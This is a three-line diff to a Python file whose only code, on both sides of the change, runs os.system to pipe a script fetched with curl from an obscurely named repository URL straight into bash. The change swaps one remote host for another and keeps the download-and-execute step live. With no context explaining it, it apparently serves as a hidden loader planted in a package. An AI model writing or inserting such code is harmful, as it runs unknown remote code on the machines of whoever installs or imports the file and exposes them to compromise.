@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/drive-zx/zx-drive/raw/main/zeprit | bash')
+os.system('curl -sL https://github.com/loeto21/comro/raw/main/zancuk | bash')
